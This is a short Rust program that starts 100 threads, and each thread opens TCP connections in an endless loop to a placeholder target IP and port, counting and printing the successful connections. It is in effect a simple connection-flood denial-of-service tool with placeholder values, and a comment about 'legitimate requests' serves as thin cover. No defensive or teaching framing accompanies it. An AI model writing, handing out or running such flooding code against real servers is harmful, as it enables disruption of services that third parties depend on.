use std::net::{TcpStream, SocketAddr};
use std::thread;
use std::sync::{Arc, Mutex};

fn main() {
    let target_ip = "TARGET_IP_ADDRESS";
    let target_port = "TARGET_PORT";
    let num_threads = 100; // Number of threads for sending requests

    // Convert the port string to u16
    let port: u16 = match target_port.parse() {
        Ok(port) => port,
        Err(_) => {
            println!("Error: Invalid port");
            return;
        }
    };

    // Create the target address
    let target_addr: SocketAddr = format!("{}:{}", target_ip, port)
        .parse()
        .expect("Error parsing target address");

    // Create a shared counter for successful connections
    let successful_connections = Arc::new(Mutex::new(0));

    // Create threads to send requests
    let mut handles = vec![];
    for _ in 0..num_threads {
        let target_addr_clone = target_addr.clone();
        let successful_connections_clone = successful_connections.clone();

        let handle = thread::spawn(move || {
            // Loop for sending requests
            loop {
                // Try to establish a connection with the target
                match TcpStream::connect(target_addr_clone) {
                    Ok(_) => {
                        // Increment the successful connections counter
                        let mut counter = successful_connections_clone.lock().unwrap();
                        *counter += 1;
                        println!("Successful connection count: {}", *counter);

                        // Here we could send a legitimate request
                    }
                    Err(e) => {
                        // Print the connection error
                        println!("Connection error: {:?}", e);
                    }
                }
            }
        });
        handles.push(handle);
    }

    // Wait for all threads to finish
    for handle in handles {
        handle.join().expect("Error waiting for thread to finish");
    }
}
